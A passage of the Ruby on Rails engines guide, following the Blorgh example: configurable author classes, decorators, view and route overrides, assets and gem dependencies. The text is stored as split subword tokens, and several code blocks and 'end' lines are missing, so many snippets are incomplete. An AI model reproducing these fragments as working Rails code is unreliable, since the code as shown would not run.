▁A ▁typical ▁application ▁m ight ▁have ▁a ▁` User ` ▁class ▁that ▁would ▁be ▁used ▁to ▁represent < n > author s ▁for ▁an ▁article ▁or ▁a ▁comment .
▁But ▁there ▁could ▁be ▁a ▁case ▁where ▁the < n > application ▁calls ▁this ▁class ▁something ▁different , ▁such ▁as ▁` Person `.
▁For ▁this < n > re as on , ▁the ▁engine ▁should ▁not ▁hard code ▁associations ▁specifically ▁for ▁a ▁` User `< n > class .
▁To ▁keep ▁it ▁simple ▁in ▁this ▁case , ▁the ▁application ▁will ▁have ▁a ▁class ▁called ▁` User `< n > that ▁represent s ▁the ▁users ▁of ▁the ▁application ▁( we ' ll ▁get ▁into ▁making ▁this < n > config ur able ▁further ▁on ).
▁It ▁can ▁be ▁generated ▁using ▁this ▁command ▁inside ▁the < n > application :
▁rails ▁g ▁model ▁user ▁name : string
▁The ▁` rake ▁db : migrate ` ▁command ▁needs ▁to ▁be ▁run ▁here ▁to ▁ensure ▁that ▁our < n > application ▁has ▁the ▁` users ` ▁table ▁for ▁future ▁use .
▁Also , ▁to ▁keep ▁it ▁simple , ▁the ▁articles ▁form ▁will ▁have ▁a ▁new ▁text ▁field ▁called < n >` author _ name `, ▁where ▁users ▁can ▁ el ec t ▁to ▁put ▁their ▁name .
▁The ▁engine ▁will ▁the n < n > take ▁this ▁name ▁and ▁either ▁create ▁a ▁new ▁` User ` ▁object ▁from ▁it , ▁or ▁find ▁one ▁that < n > already ▁has ▁that ▁name .
▁The ▁engine ▁will ▁the n ▁associate ▁the ▁article ▁with ▁the ▁found ▁or < n > created ▁` User ` ▁object .
▁First , ▁the ▁` author _ name ` ▁text ▁field ▁needs ▁to ▁be ▁added ▁to ▁the < n >` app / views / blorgh / articles / _ form . html . erb ` ▁partial ▁inside ▁the ▁engine .
▁This ▁can ▁be < n > add ed ▁above ▁the ▁` title ` ▁field ▁with ▁this ▁code :
▁< div ▁class =" field ">
▁<%= ▁f . label ▁: author _ name ▁%>< br >
▁<%= ▁f . text _ field ▁: author _ name ▁%>
▁Next , ▁we ▁need ▁to ▁update ▁our ▁` Blorgh :: Article Controller # article _ params ` ▁method ▁to < n > permit ▁the ▁new ▁form ▁parameter :
▁def ▁article _ params
▁params . require (: article ). permit (: title , ▁: text , ▁: author _ name )
▁The ▁` Blorgh :: Article ` ▁model ▁should ▁the n ▁have ▁some ▁code ▁to ▁convert ▁the ▁` author _ name `< n > field ▁into ▁an ▁actual ▁` User ` ▁object ▁and ▁associate ▁it ▁as ▁that ▁article ' s ▁` author `< n > before ▁the ▁article ▁is ▁saved .
▁It ▁will ▁also ▁need ▁to ▁have ▁an ▁` attr _ accessor ` ▁set ▁up < n > for ▁this ▁field , ▁so ▁that ▁the ▁set ter ▁and ▁get ter ▁methods ▁are ▁defined ▁for ▁it .
▁To ▁do ▁all ▁this , ▁you ' ll ▁need ▁to ▁add ▁the ▁` attr _ accessor ` ▁for ▁` author _ name `, ▁the < n > association ▁for ▁the ▁author ▁and ▁the ▁` before _ save ` ▁call ▁into < n >` app / models / blorgh / article . rb `.
▁The ▁` author ` ▁association ▁will ▁be ▁hard - code d ▁to ▁the < n >` User ` ▁class ▁for ▁the ▁time ▁being .
▁ attr _ accessor ▁: author _ name
▁belongs _ to ▁: author , ▁class _ name : ▁" User "
▁before _ save ▁: set _ author
▁def ▁set _ author
▁self . author ▁= ▁User . find _ or _ create _ by ( name : ▁author _ name )
▁By ▁represent ing ▁the ▁` author ` ▁association ' s ▁object ▁with ▁the ▁` User ` ▁class , ▁a ▁link < n > is ▁establish ed ▁between ▁the ▁engine ▁and ▁the ▁application .
▁There ▁needs ▁to ▁be ▁a ▁way < n > of ▁associat ing ▁the ▁records ▁in ▁the ▁` blorgh _ articles ` ▁table ▁with ▁the ▁records ▁in ▁the < n >` users ` ▁table .
▁Because ▁the ▁association ▁is ▁called ▁` author `, ▁there ▁should ▁be ▁an < n >` author _ id ` ▁column ▁added ▁to ▁the ▁` blorgh _ articles ` ▁table .
▁To ▁generate ▁this ▁new ▁column , ▁run ▁this ▁command ▁within ▁the ▁engine :
▁ $ ▁bin / rails ▁g ▁migration ▁add _ author _ id _ to _ blorgh _ articles ▁author _ id : integer
▁NOTE : ▁D ue ▁to ▁the ▁migration ' s ▁name ▁and ▁the ▁column ▁specific ation ▁after ▁it , ▁Rails < n > will ▁automatically ▁know ▁that ▁you ▁want ▁to ▁add ▁a ▁column ▁to ▁a ▁specific ▁table ▁and < n > write ▁that ▁into ▁the ▁migration ▁for ▁you .
▁You ▁don ' t ▁need ▁to ▁tell ▁it ▁any ▁more ▁than < n > this .
▁This ▁migration ▁will ▁need ▁to ▁be ▁run ▁on ▁the ▁application .
▁To ▁do ▁that , ▁it ▁must ▁first < n > be ▁copie d ▁using ▁this ▁command :
▁Noti ce ▁that ▁only ▁ _ one _ ▁migration ▁was ▁copie d ▁over ▁here .
▁This ▁is ▁because ▁the ▁first < n > two ▁migrations ▁were ▁copie d ▁over ▁the ▁first ▁time ▁this ▁command ▁was ▁run .
▁ Migration ▁with ▁the ▁same ▁name ▁already ▁exists . < n >
▁Run ▁the ▁migration ▁using :
▁Now ▁with ▁all ▁the ▁pieces ▁in ▁place , ▁an ▁action ▁will ▁take ▁place ▁that ▁will ▁associate < n > an ▁author ▁- ▁represent ed ▁by ▁a ▁record ▁in ▁the ▁` users ` ▁table ▁- ▁with ▁an ▁article ,< n > re present ed ▁by ▁the ▁` blorgh _ articles ` ▁table ▁from ▁the ▁engine .
▁F inally , ▁the ▁author ' s ▁name ▁should ▁be ▁displayed ▁on ▁the ▁article ' s ▁page .
▁By ▁output ting ▁`@ article . author ` ▁using ▁the ▁` <%= ` ▁tag , ▁the ▁` to _ s ` ▁method ▁will ▁be < n > called ▁on ▁the ▁object .
▁By ▁default , ▁this ▁will ▁look ▁quite ▁ugly :
▁Now ▁instead ▁of ▁the ▁ugly ▁Ruby ▁object ▁output , ▁the ▁author ' s ▁name ▁will ▁be ▁displayed .
▁#### ▁Using ▁a ▁Controller ▁Provide d ▁by ▁the ▁Application
▁Because ▁Rails ▁controllers ▁generally ▁share ▁code ▁for ▁things ▁like ▁authentication < n > and ▁access ing ▁session ▁variables , ▁they ▁inherit ▁from ▁` Application Controller ` ▁by < n > default .
▁Rails ▁engines , ▁however ▁are ▁scope d ▁to ▁run ▁in dependent ly ▁from ▁the ▁main < n > application , ▁so ▁each ▁engine ▁get s ▁a ▁scope d ▁` Application Controller `.
▁This < n > namespace ▁prevent s ▁code ▁co ll is ion s , ▁but ▁often ▁engine ▁controllers ▁need ▁to ▁access < n > methods ▁in ▁the ▁main ▁application ' s ▁` Application Controller `.
▁An ▁easy ▁way ▁to < n > provide ▁this ▁access ▁is ▁to ▁change ▁the ▁engine ' s ▁scope d ▁` Application Controller ` ▁to < n > inherit ▁from ▁the ▁main ▁application ' s ▁` Application Controller `.
▁For ▁our ▁Blorgh < n > engine ▁this ▁would ▁be ▁done ▁by ▁changing < n >` app / controllers / blorgh / application _ controller . rb ` ▁to ▁look ▁like :
▁end
▁By ▁default , ▁the ▁engine ' s ▁controllers ▁inherit ▁from < n >` Blorgh :: Application Controller `.
▁So , ▁after ▁making ▁this ▁change ▁they ▁will ▁have < n > access ▁to ▁the ▁main ▁application ' s ▁` Application Controller `, ▁as ▁though ▁they ▁were < n > part ▁of ▁the ▁main ▁application .
▁This ▁change ▁does ▁require ▁that ▁the ▁engine ▁is ▁run ▁from ▁a ▁Rails ▁application ▁that < n > has ▁an ▁` Application Controller `.
▁### ▁Configur ing ▁an ▁ Engine
▁This ▁section ▁cover s ▁how ▁to ▁make ▁the ▁` User ` ▁class ▁config ur able , ▁followed ▁by < n > ge n er al ▁configuration ▁t ips ▁for ▁the ▁engine .
▁#### ▁Setting ▁Configuration ▁Setting s ▁in ▁the ▁Application
▁The ▁next ▁step ▁is ▁to ▁make ▁the ▁class ▁that ▁represent s ▁a ▁` User ` ▁in ▁the ▁application < n > custom i z able ▁for ▁the ▁engine .
▁This ▁is ▁because ▁that ▁class ▁may ▁not ▁always ▁be < n >` User `, ▁as ▁previous ly ▁explained .
▁To ▁make ▁this ▁setting ▁customiz able , ▁the ▁engine < n > will ▁have ▁a ▁configuration ▁setting ▁called ▁` author _ class ` ▁that ▁will ▁be ▁used ▁to < n > spec ify ▁which ▁class ▁represent s ▁users ▁inside ▁the ▁application .
▁To ▁define ▁this ▁configuration ▁setting , ▁you ▁should ▁use ▁a ▁` m attr _ accessor ` ▁inside < n > the ▁` Blorgh ` ▁module ▁for ▁the ▁engine .
▁Add ▁this ▁line ▁to ▁` lib / blorgh . rb ` ▁inside ▁the < n > engine :
▁m attr _ accessor ▁: author _ class
▁This ▁method ▁works ▁like ▁its ▁ br other s , ▁` attr _ accessor ` ▁and ▁` c attr _ accessor `, ▁but < n > provide s ▁a ▁set ter ▁and ▁get ter ▁method ▁on ▁the ▁module ▁with ▁the ▁specified ▁name .
▁To < n > use ▁it , ▁it ▁must ▁be ▁referenced ▁using ▁` Blorgh . author _ class `.
▁The ▁next ▁step ▁is ▁to ▁switch ▁the ▁` Blorgh :: Article ` ▁model ▁over ▁to ▁this ▁new ▁setting . < n >
▁Change ▁the ▁` belongs _ to ` ▁association ▁inside ▁this ▁model < n > ( ` app / models / blorgh / article . rb `) ▁to ▁this :
▁belongs _ to ▁: author , ▁class _ name : ▁Blorgh . author _ class
▁The ▁` set _ author ` ▁method ▁in ▁the ▁` Blorgh :: Article ` ▁model ▁should ▁also ▁use ▁this ▁class :
▁self . author ▁= ▁Blorgh . author _ class . constantize . find _ or _ create _ by ( name : ▁author _ name )
▁To ▁save ▁ having ▁to ▁call ▁` constantize ` ▁on ▁the ▁` author _ class ` ▁result ▁all ▁the ▁time ,< n > you ▁could ▁instead ▁just ▁override ▁the ▁` author _ class ` ▁get ter ▁method ▁inside ▁the < n >` Blorgh ` ▁module ▁in ▁the ▁` lib / blorgh . rb ` ▁file ▁to ▁always ▁call ▁` constantize ` ▁on ▁the < n > save d ▁value ▁before ▁return ing ▁the ▁result :
▁def ▁self . author _ class
▁@ @ author _ class . constantize
▁This ▁would ▁the n ▁turn ▁the ▁above ▁code ▁for ▁` set _ author ` ▁into ▁this :
▁self . author ▁= ▁Blorgh . author _ class . find _ or _ create _ by ( name : ▁author _ name )
▁Re s ul ting ▁in ▁something ▁a ▁little ▁short er , ▁and ▁more ▁ implicit ▁in ▁its ▁behavior .
▁The < n >` author _ class ` ▁method ▁should ▁always ▁return ▁a ▁` Class ` ▁object .
▁S ince ▁we ▁changed ▁the ▁` author _ class ` ▁method ▁to ▁return ▁a ▁` Class ` ▁instead ▁of ▁a < n >` String `, ▁we ▁must ▁also ▁modify ▁our ▁` belongs _ to ` ▁definition ▁in ▁the ▁` Blorgh :: Article `
▁belongs _ to ▁: author , ▁class _ name : ▁Blorgh . author _ class . to _ s
▁To ▁set ▁this ▁configuration ▁setting ▁within ▁the ▁application , ▁an ▁initializer ▁should < n > be ▁used .
▁By ▁using ▁an ▁initializer , ▁the ▁configuration ▁will ▁be ▁set ▁up ▁before ▁the < n > application ▁start s ▁and ▁calls ▁the ▁engine ' s ▁models , ▁which ▁may ▁depend ▁on ▁this < n > configuration ▁setting ▁existing .
▁Create ▁a ▁new ▁initializer ▁at ▁` config / initializers / blorgh . rb ` ▁inside ▁the < n > application ▁where ▁the ▁` blorgh ` ▁engine ▁is ▁installed ▁and ▁put ▁this ▁content ▁in ▁it :
▁WARNING : ▁It ' s ▁very ▁important ▁here ▁to ▁use ▁the ▁` String ` ▁version ▁of ▁the ▁class ,< n > rather ▁than ▁the ▁class ▁itself .
▁If ▁you ▁were ▁to ▁use ▁the ▁class , ▁Rails ▁would ▁attempt < n > to ▁load ▁that ▁class ▁and ▁the n ▁reference ▁the ▁related ▁table .
▁This ▁could ▁lead ▁to < n > problem s ▁if ▁the ▁table ▁was n ' t ▁already ▁existing .
▁There for e , ▁a ▁` String ` ▁should ▁be < n > us ed ▁and ▁the n ▁convert ed ▁to ▁a ▁class ▁using ▁` constantize ` ▁in ▁the ▁engine ▁later ▁on .
▁G o ▁a head ▁and ▁try ▁to ▁create ▁a ▁new ▁article .
▁You ▁will ▁see ▁that ▁it ▁works ▁exactly ▁in ▁the < n > s a me ▁way ▁as ▁before , ▁except ▁this ▁time ▁the ▁engine ▁is ▁using ▁the ▁configuration < n > set ting ▁in ▁` config / initializers / blorgh . rb ` ▁to ▁learn ▁what ▁the ▁class ▁is .
▁There ▁are ▁now ▁no ▁ str ic t ▁dependencies ▁on ▁what ▁the ▁class ▁is , ▁only ▁what ▁the ▁API ▁for < n > the ▁class ▁must ▁be .
▁The ▁engine ▁simply ▁requires ▁this ▁class ▁to ▁define ▁a < n >` find _ or _ create _ by ` ▁method ▁which ▁returns ▁an ▁object ▁of ▁that ▁class , ▁to ▁be < n > associated ▁with ▁an ▁article ▁when ▁it ' s ▁created .
▁This ▁object , ▁of ▁course , ▁should ▁have < n > some ▁sort ▁of ▁identifier ▁by ▁which ▁it ▁can ▁be ▁referenced .
▁#### ▁General ▁ Engine ▁Configuration
▁With in ▁an ▁engine , ▁there ▁may ▁come ▁a ▁time ▁where ▁you ▁wish ▁to ▁use ▁things ▁such ▁as < n > initializers , ▁in ter n ation al i z ation ▁or ▁other ▁configuration ▁options .
▁The ▁great < n > new s ▁is ▁that ▁these ▁things ▁are ▁entire ly ▁possible , ▁because ▁a ▁Rails ▁engine ▁share s < n > much ▁the ▁same ▁functionality ▁as ▁a ▁Rails ▁application .
▁In ▁fact , ▁a ▁Rails < n > application ' s ▁functionality ▁is ▁actually ▁a ▁ super set ▁of ▁what ▁is ▁provided ▁by < n > engine s !
▁If ▁you ▁wish ▁to ▁use ▁an ▁initializer ▁- ▁code ▁that ▁should ▁run ▁before ▁the ▁engine ▁is < n > load ed ▁- ▁the ▁place ▁for ▁it ▁is ▁the ▁` config / initializers ` ▁folder .
▁This ▁directory ' s < n > functionality ▁is ▁explained ▁in ▁the ▁[ Initial ize r s < n > section ]( configuring . html # initializers ) ▁of ▁the ▁Configur ing ▁guide , ▁and ▁works < n > pre ci se ly ▁the ▁same ▁way ▁as ▁the ▁` config / initializers ` ▁directory ▁inside ▁an < n > application .
▁The ▁same ▁thing ▁go es ▁if ▁you ▁want ▁to ▁use ▁a ▁standard ▁initializer .
▁For ▁locale s , ▁simply ▁place ▁the ▁locale ▁files ▁in ▁the ▁` config / locale s ` ▁directory ,< n > j us t ▁like ▁you ▁would ▁in ▁an ▁application .
▁Testing ▁an ▁engine
▁When ▁an ▁engine ▁is ▁generated , ▁there ▁is ▁a ▁small er ▁ dummy ▁application ▁created ▁inside < n > it ▁at ▁` test / dummy `.
▁This ▁application ▁is ▁used ▁as ▁a ▁m o un ting ▁point ▁for ▁the ▁engine ,< n > to ▁make ▁testing ▁the ▁engine ▁ extremely ▁simple .
▁You ▁may ▁extend ▁this ▁application ▁by < n > generating ▁controllers , ▁models ▁or ▁views ▁from ▁within ▁the ▁directory , ▁and ▁the n ▁use < n > th o se ▁to ▁test ▁your ▁engine .
▁The ▁` test ` ▁directory ▁should ▁be ▁treat ed ▁like ▁a ▁typical ▁Rails ▁testing ▁environment ,< n > allow ing ▁for ▁ unit , ▁functional ▁and ▁integration ▁tests .
▁### ▁F un ctional ▁Tests
▁A ▁matter ▁worth ▁tak ing ▁into ▁consider ation ▁when ▁writing ▁functional ▁tests ▁is ▁that < n > the ▁tests ▁are ▁going ▁to ▁be ▁running ▁on ▁an ▁application ▁- ▁the ▁` test / dummy `< n > application ▁- ▁rather ▁than ▁your ▁engine .
▁This ▁is ▁due ▁to ▁the ▁setup ▁of ▁the ▁testing < n > environment ; ▁an ▁engine ▁needs ▁an ▁application ▁as ▁a ▁host ▁for ▁testing ▁its ▁main < n > functionality , ▁es pecially ▁controllers .
▁This ▁means ▁that ▁if ▁you ▁were ▁to ▁make ▁a < n > t y p ical ▁` GET ` ▁to ▁a ▁controller ▁in ▁a ▁controller ' s ▁functional ▁test ▁like ▁this :
▁get ▁: index
▁...
▁It ▁may ▁not ▁function ▁correctly .
▁This ▁is ▁because ▁the ▁application ▁does n ' t ▁know ▁how < n > to ▁route ▁these ▁requests ▁to ▁the ▁engine ▁unless ▁you ▁explicitly ▁tell ▁it ▁** how ** .
▁setup ▁do
▁@ routes ▁= ▁ Engine . routes
▁This ▁tell s ▁the ▁application ▁that ▁you ▁ still ▁want ▁to ▁perform ▁a ▁` GET ` ▁request ▁to ▁the < n >` index ` ▁action ▁of ▁this ▁controller , ▁but ▁you ▁want ▁to ▁use ▁the ▁engine ' s ▁route ▁to ▁get < n > the re , ▁rather ▁than ▁the ▁application ' s ▁one .
▁I mprov ing ▁engine ▁functionality
▁This ▁section ▁ explain s ▁how ▁to ▁add ▁and / or ▁override ▁engine ▁MVC ▁functionality ▁in ▁the < n > main ▁Rails ▁application .
▁### ▁ Overriding ▁Model s ▁and ▁Controller s
▁ Engine ▁model ▁and ▁controller ▁classes ▁can ▁be ▁extend ed ▁by ▁open ▁class ing ▁them ▁in ▁the < n > main ▁Rails ▁application ▁( since ▁model ▁and ▁controller ▁classes ▁are ▁just ▁Ruby ▁classes < n > that ▁inherit ▁Rails ▁specific ▁functionality ).
▁Open ▁class ing ▁an ▁ Engine ▁class < n > re define s ▁it ▁for ▁use ▁in ▁the ▁main ▁application .
▁This ▁is ▁usually ▁implemented ▁by < n > using ▁the ▁ decorator ▁pattern .
▁For ▁simple ▁class ▁modification s , ▁use ▁` Class # class _ eval `.
▁For ▁complex ▁class < n > mod if ic ation s , ▁consider ▁using ▁` ActiveSupport :: Concern `.
▁#### ▁A ▁note ▁on ▁De c or at or s ▁and ▁Load ing ▁Code
▁Because ▁these ▁ decorator s ▁are ▁not ▁referenced ▁by ▁your ▁Rails ▁application ▁itself ,< n > Rails ' ▁ autoload ing ▁system ▁will ▁not ▁ k ic k ▁in ▁and ▁load ▁your ▁ decorator s .
▁This ▁means < n > that ▁you ▁need ▁to ▁require ▁them ▁yourself .
▁Here ▁is ▁some ▁sample ▁code ▁to ▁do ▁this :
▁# ▁ lib / blorgh / engine . rb
▁config . to _ prepare ▁do
▁D ir . g lo b ( Rails . root ▁ + ▁" app / decorator s / ** / * _ decorator * . rb ") . each ▁do ▁| c |
▁require _ dependency ( c )
▁This ▁does n ' t ▁apply ▁to ▁just ▁De c or at or s , ▁but ▁anything ▁that ▁you ▁add ▁in ▁an ▁engine < n > that ▁is n ' t ▁referenced ▁by ▁your ▁main ▁application .
▁#### ▁Implement ing ▁De c or at or ▁ Pattern ▁Using ▁ Class # class _ eval
▁** Adding ** ▁` Article # time _ since _ created ` :
▁# ▁My A p p / app / decorator s / models / blorgh / article _ decorator . rb
▁Blorgh :: Article . class _ eval ▁do
▁def ▁time _ since _ created
▁Time . current ▁- ▁created _ at
▁# ▁Blorgh / app / models / article . rb
▁** Overriding ** ▁` Article # sum m ary ` :
▁def ▁summary
▁" # { title } ▁- ▁# { truncate ( text )} "
▁" # { title } "
▁#### ▁Implement ing ▁De c or at or ▁ Pattern ▁Using ▁ ActiveSupport :: Concern
▁ ActiveSupport :: Concern ▁manage s ▁load ▁order ▁of ▁in ter link ed ▁ dependent ▁module s ▁and < n > classes ▁at ▁run ▁time ▁allow ing ▁you ▁to ▁significant ly ▁ mod ul ar ize ▁your ▁code .
▁** Adding ** ▁` Article # time _ since _ created ` ▁and ▁** Overriding ** ▁` Article # sum m ary ` :
▁# ▁My A p p / app / models / blorgh / article . rb
▁class ▁Blorgh :: Article ▁< ▁ActiveRecord :: Base
▁include ▁Blorgh :: Concern s :: Model s :: Article
▁# ▁Blorgh / lib / co n c er n s / models / article
▁module ▁Blorgh :: Concern s :: Model s :: Article
▁extend ▁ ActiveSupport :: Concern
▁# ▁' include d ▁do ' ▁cause s ▁the ▁included ▁code ▁to ▁be ▁evaluated ▁in ▁the
▁# ▁context ▁where ▁it ▁is ▁included ▁( article . rb ), ▁rather ▁than ▁being
▁# ▁executed ▁in ▁the ▁module ' s ▁context ▁( blorgh / co n c er n s / models / article ).
▁included ▁do
▁ attr _ accessor ▁: author _ name
▁belongs _ to ▁: author , ▁class _ name : ▁" User "
▁before _ save ▁: set _ author
▁private
▁def ▁set _ author
▁self . author ▁= ▁User . find _ or _ create _ by ( name : ▁author _ name )
▁module ▁ Class Method s
▁def ▁some _ class _ method
▁' some ▁class ▁method ▁string '
▁### ▁ Overriding ▁View s
▁When ▁Rails ▁look s ▁for ▁a ▁view ▁to ▁render , ▁it ▁will ▁first ▁look ▁in ▁the ▁` app / views `< n > directory ▁of ▁the ▁application .
▁If ▁it ▁cannot ▁find ▁the ▁view ▁there , ▁it ▁will ▁check ▁in < n > the ▁` app / views ` ▁directories ▁of ▁all ▁engines ▁that ▁have ▁this ▁directory .
▁When ▁the ▁application ▁is ▁as k ed ▁to ▁render ▁the ▁view ▁for ▁` Blorgh :: Article sController ` ' s < n > index ▁action , ▁it ▁will ▁first ▁look ▁for ▁the ▁path < n >` app / views / blorgh / articles / index . html . erb ` ▁within ▁the ▁application .
▁If ▁it ▁cannot < n > find ▁it , ▁it ▁will ▁look ▁inside ▁the ▁engine .
▁You ▁can ▁override ▁this ▁view ▁in ▁the ▁application ▁by ▁simply ▁creating ▁a ▁new ▁file ▁at < n >` app / views / blorgh / articles / index . html . erb `.
▁Then ▁you ▁can ▁completely ▁change ▁what < n > this ▁view ▁would ▁normally ▁output .
▁T ry ▁this ▁now ▁by ▁creating ▁a ▁new ▁file ▁at ▁` app / views / blorgh / articles / index . html . erb `< n > and ▁put ▁this ▁content ▁in ▁it :
▁< h 1> Article s </ h 1>
▁<%= ▁link _ to ▁" New ▁Article ", ▁new _ article _ path ▁%>
▁<% ▁@ articles . each ▁do ▁| article | ▁%>
▁< h 2 > <%= ▁article . title ▁%></ h 2 >
▁< small > B y ▁<%= ▁article . author ▁%></ small >
▁<%= ▁simple _ format ( article . text ) ▁%>
▁< h r >
▁### ▁Routes
▁Routes ▁inside ▁an ▁engine ▁are ▁is olated ▁from ▁the ▁application ▁by ▁default .
▁This ▁is < n > d one ▁by ▁the ▁` isolate _ namespace ` ▁call ▁inside ▁the ▁` Engine ` ▁class .
▁This ▁essential ly < n > me an s ▁that ▁the ▁application ▁and ▁its ▁engines ▁can ▁have ▁identical ly ▁named ▁routes ▁and < n > the y ▁will ▁not ▁cl as h .
▁Routes ▁inside ▁an ▁engine ▁are ▁d raw n ▁on ▁the ▁` Engine ` ▁class ▁within < n >` config / routes . rb `, ▁like ▁this :
▁By ▁ having ▁is olated ▁routes ▁such ▁as ▁this , ▁if ▁you ▁wish ▁to ▁link ▁to ▁an ▁are a ▁of ▁an < n > engine ▁from ▁within ▁an ▁application , ▁you ▁will ▁need ▁to ▁use ▁the ▁engine ' s ▁routing < n > proxy ▁method .
▁Call s ▁to ▁normal ▁routing ▁methods ▁such ▁as ▁` articles _ path ` ▁may ▁end ▁up < n > go ing ▁to ▁un de s ir ed ▁location s ▁if ▁both ▁the ▁application ▁and ▁the ▁engine ▁have ▁such ▁a < n > helper ▁defined .
▁For ▁instance , ▁the ▁following ▁example ▁would ▁go ▁to ▁the ▁application ' s ▁` articles _ path `< n > if ▁that ▁template ▁was ▁rendered ▁from ▁the ▁application , ▁or ▁the ▁engine ' s ▁` articles _ path `< n > if ▁it ▁was ▁rendered ▁from ▁the ▁engine :
▁<%= ▁link _ to ▁" B log ▁articles ", ▁articles _ path ▁%>
▁To ▁make ▁this ▁route ▁always ▁use ▁the ▁engine ' s ▁` articles _ path ` ▁routing ▁helper ▁method ,< n > we ▁must ▁call ▁the ▁method ▁on ▁the ▁routing ▁ proxy ▁method ▁that ▁share s ▁the ▁same ▁name ▁as < n > the ▁engine .
▁<%= ▁link _ to ▁" B log ▁articles ", ▁ blorgh . articles _ path ▁%>
▁If ▁you ▁wish ▁to ▁reference ▁the ▁application ▁inside ▁the ▁engine ▁in ▁a ▁similar ▁way , ▁use < n > the ▁` main _ app ` ▁helper :
▁<%= ▁link _ to ▁" Home ", ▁main _ app . root _ path ▁%>
▁If ▁you ▁were ▁to ▁use ▁this ▁inside ▁an ▁engine , ▁it ▁would ▁** always ** ▁go ▁to ▁the < n > application ' s ▁root .
▁If ▁you ▁were ▁to ▁leave ▁off ▁the ▁` main _ app ` ▁" routing ▁ proxy " < n > method ▁call , ▁it ▁could ▁ potentially ▁go ▁to ▁the ▁engine ' s ▁or ▁application ' s ▁root ,< n > de pending ▁on ▁where ▁it ▁was ▁called ▁from .
▁If ▁a ▁template ▁rendered ▁from ▁within ▁an ▁engine ▁attempt s ▁to ▁use ▁one ▁of ▁the < n > application ' s ▁routing ▁helper ▁methods , ▁it ▁may ▁result ▁in ▁an ▁undefined ▁method ▁call . < n >
▁If ▁you ▁ en counter ▁such ▁an ▁issue , ▁ensure ▁that ▁you ' re ▁not ▁attempt ing ▁to ▁call ▁the < n > application ' s ▁routing ▁methods ▁without ▁the ▁` main _ app ` ▁prefix ▁from ▁within ▁the < n > engine .
▁### ▁ Asset s
▁ Asset s ▁within ▁an ▁engine ▁work ▁in ▁an ▁identical ▁way ▁to ▁a ▁full ▁application .
▁Like ▁all ▁of ▁the ▁other ▁components ▁of ▁an ▁engine , ▁the ▁assets ▁should ▁be ▁namespaced . < n >
▁This ▁means ▁that ▁if ▁you ▁have ▁an ▁asset ▁called ▁` style . css `, ▁it ▁should ▁be ▁placed ▁at < n >` app / assets / stylesheets / [ engine ▁name ] / style . css `, ▁rather ▁than < n >` app / assets / stylesheets / style . css `.
▁If ▁this ▁asset ▁is n ' t ▁namespaced , ▁there ▁is ▁a < n > p o s s i b il ity ▁that ▁the ▁host ▁application ▁could ▁have ▁an ▁asset ▁named ▁identical ly , ▁in < n > which ▁case ▁the ▁application ' s ▁asset ▁would ▁take ▁precedence ▁and ▁the ▁engine ' s ▁one < n > w o ul d ▁be ▁ignored .
▁Imag ine ▁that ▁you ▁did ▁have ▁an ▁asset ▁located ▁at < n >` app / assets / stylesheets / blorgh / style . css ` ▁To ▁include ▁this ▁asset ▁inside ▁an < n > application , ▁just ▁use ▁` stylesheet _ link _ tag ` ▁and ▁reference ▁the ▁asset ▁as ▁if ▁it < n > we re ▁inside ▁the ▁engine :
▁<%= ▁stylesheet _ link _ tag ▁" blorgh / style . css " ▁%>
▁You ▁can ▁also ▁specify ▁these ▁assets ▁as ▁dependencies ▁of ▁other ▁assets ▁using ▁ Asset < n > P ip e line ▁require ▁statement s ▁in ▁processed ▁files :
▁INFO . ▁Re member ▁that ▁in ▁order ▁to ▁use ▁languages ▁like ▁Sass ▁or ▁CoffeeScript , ▁you < n > s h o ul d ▁add ▁the ▁relevant ▁library ▁to ▁your ▁engine ' s ▁` . gem spec `.
▁### ▁Sep ar ate ▁ Asset s ▁ & ▁P re com p il ing
▁There ▁are ▁some ▁situation s ▁where ▁your ▁engine ' s ▁assets ▁are ▁not ▁required ▁by ▁the < n > host ▁application .
▁For ▁example , ▁say ▁that ▁you ' ve ▁created ▁an ▁admin ▁functionality < n > that ▁only ▁exists ▁for ▁your ▁engine .
▁In ▁this ▁case , ▁the ▁host ▁application ▁does n ' t < n > n e ed ▁to ▁require ▁` admin . css ` ▁or ▁` admin . js `.
▁On ly ▁the ▁gem ' s ▁admin ▁layout ▁needs < n > the se ▁assets .
▁It ▁does n ' t ▁make ▁sense ▁for ▁the ▁host ▁app ▁to ▁include < n >` " blorgh / admin . css " ` ▁in ▁its ▁stylesheets .
▁In ▁this ▁situation , ▁you ▁should < n > e xplicit ly ▁define ▁these ▁assets ▁for ▁pre com p il ation .
▁This ▁tell s ▁ sprockets ▁to ▁add < n > your ▁engine ▁assets ▁when ▁` rake ▁assets : precompile ` ▁is ▁trigger ed .
▁You ▁can ▁define ▁assets ▁for ▁pre com p il ation ▁in ▁` engine . rb ` :
▁initializer ▁" blorgh . assets . precompile " ▁do ▁| app |
▁app . config . assets . precompile ▁ + = ▁% w ( admin . css ▁admin . js )
▁For ▁more ▁information , ▁read ▁the ▁[ Asset ▁Pipeline ▁guide ]( asset _ pipeline . html ).
▁### ▁Other ▁G em ▁De p end en c ies
▁G em ▁dependencies ▁inside ▁an ▁engine ▁should ▁be ▁specified ▁inside ▁the ▁` . gem spec ` ▁file < n > at ▁the ▁root ▁of ▁the ▁engine .
▁The ▁reason ▁is ▁that ▁the ▁engine ▁may ▁be ▁installed ▁as ▁a < n > gem .
▁If ▁dependencies ▁were ▁to ▁be ▁specified ▁inside ▁the ▁` Gemfile `, ▁these ▁would ▁not < n > be ▁recognize d ▁by ▁a ▁tr ad it ion al ▁gem ▁install ▁and ▁so ▁they ▁would ▁not ▁be ▁installed ,< n > ca using ▁the ▁engine ▁to ▁m al function .
▁To ▁specify ▁a ▁ dependency ▁that ▁should ▁be ▁installed ▁with ▁the ▁engine ▁during ▁a < n > tr ad it ion al ▁` gem ▁install `, ▁specify ▁it ▁inside ▁the ▁` G em :: Specific ation ` ▁block < n > in side ▁the ▁` . gem spec ` ▁file ▁in ▁the ▁engine :
▁ s . add _ dependency ▁" m oo "
▁To ▁specify ▁a ▁ dependency ▁that ▁should ▁only ▁be ▁installed ▁as ▁a ▁development < n > dependency ▁of ▁the ▁application , ▁specify ▁it ▁like ▁this :
▁ s . add _ development _ dependency ▁" m oo "
▁Bo th ▁kind s ▁of ▁dependencies ▁will ▁be ▁installed ▁when ▁` bundle ▁install ` ▁is ▁run ▁inside < n > of ▁the ▁application .
▁The ▁development ▁dependencies ▁for ▁the ▁gem ▁will ▁only ▁be ▁used < n > when ▁the ▁tests ▁for ▁the ▁engine ▁are ▁running .
